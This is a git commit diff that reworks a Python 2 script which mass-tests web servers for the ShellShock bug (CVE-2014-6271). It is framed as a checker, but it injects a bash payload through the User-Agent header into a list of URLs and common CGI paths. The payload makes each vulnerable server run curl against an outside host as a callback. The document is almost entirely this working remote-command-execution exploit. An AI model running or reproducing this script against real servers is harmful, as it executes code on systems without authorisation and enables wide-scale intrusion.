c843c525b3e1958f843f8dc1e432830d01e1e64d
Kevin Rudissaar <kevin.rudissaar@gmail.com>
2018-08-05 17:36:20 +0000

    Improved shell-shock.py script.

--- shell-shock.py
+++ shell-shock.py
@@ -1,4 +1,8 @@
 #!/usr/bin/env python
+# pylint: disable=C0103
+# pylint: disable=C0413
+# pylint: disable=W0621
+# pylint: disable=W0702
 
 '''
 Script that checks if remote web servers are vulnarable to ShellShock attack (CVE-2014-6271).
@@ -16,9 +20,11 @@ Dependencies:
 EXPLOIT = '() { :;}; echo Content-Type: text/plain ; echo ; /bin/bash -c "'
 COMMAND = 'curl -L -s -I http://www.example.com/shell-shock'
 
-from mechanize import Browser, _http
 import os
+import socket
 import sys
+from urlparse import urlparse
+from mechanize import Browser
 
 if len(sys.argv) != 2:
     print 'Usage: ' + sys.argv[0] + ' [filename]'
@@ -31,7 +37,15 @@ if not os.path.isfile(URLS_FILE):
     print 'Error: file ' + '"' + URLS_FILE + '"' + " doesn't exist.\n"
     sys.exit(1)
 
-BR = Browser()
+COMMON_PATHS = [
+    'bin',
+    'bin/status',
+    'cgi',
+    'cgi/status',
+    'cgi-bin',
+    'cgi-bin/status'
+]
+
 URLS = list()
 
 with open(URLS_FILE, 'r') as content:
@@ -40,37 +54,68 @@ with open(URLS_FILE, 'r') as content:
         if url not in URLS:
             URLS.append(url)
 
+def resolve_url(url):
+    '''Function that checks if hostname is an IP or domain, if it's domain then returns IP.'''
+    parsed_url = urlparse(url)
+    netloc = parsed_url.netloc
+
+    try:
+        socket.inet_aton(netloc)
+    except socket.error:
+        ip = socket.gethostbyname(netloc)
+        url = parsed_url._replace(netloc=ip).geturl()
+        return url
+
+    return None
+
+def generate_urls(urls):
+    '''Generates list of urls with common paths to increase chance of hitting right spot.'''
+    generated_urls = list()
+
+    for url in urls:
+        if not url.endswith('/'):
+            url += '/'
+
+        generated_urls.append(url)
+
+        for common_path in COMMON_PATHS:
+            generated_urls.append(url + common_path)
+
+    return generated_urls
+
 if bool(URLS):
     for url in URLS:
         if url.find('cgi') == -1 or url.find('bin') == -1:
-            if not url.endswith('/'):
-                url += '/'
+            base_urls = [url]
 
-            generated_urls = [
-                url,
-                url + 'bin',
-                url + 'bin/status',
-                url + 'cgi',
-                url + 'cgi/status',
-                url + 'cgi-bin',
-                url + 'cgi-bin/status'
-            ]
+            if resolve_url(url):
+                base_urls.append(resolve_url(url))
+
+            generated_urls = generate_urls(base_urls)
 
             for generated_url in generated_urls:
                 print '> Sending shock to: ' + generated_url
                 generated_command = COMMAND + ' -A ' + generated_url
-                BR.addheaders = [('User-agent', EXPLOIT + generated_command + '"')]
+                br = Browser()
+                br.addheaders = [('User-agent', EXPLOIT + generated_command + '"')]
 
                 try:
-                    RESPONSE = BR.open(generated_url)
+                    RESPONSE = br.open(generated_url, None, 3)
                 except:
                     pass
         else:
-            try:
-                generated_command = COMMAND + ' -A ' + url
-                BR.addheaders = [('User-agent', EXPLOIT + generated_command + '"')]
-                RESPONSE = BR.open(url)
-            except:
-                pass
+            base_urls = [url]
+
+            if resolve_url(url):
+                base_urls.append(resolve_url(url))
+
+            for base_url in base_urls:
+                try:
+                    generated_command = COMMAND + ' -A ' + base_url
+                    br = Browser()
+                    br.addheaders = [('User-agent', EXPLOIT + generated_command + '"')]
+                    RESPONSE = br.open(base_url, None, 3)
+                except:
+                    pass
 
 print '> Finished.'
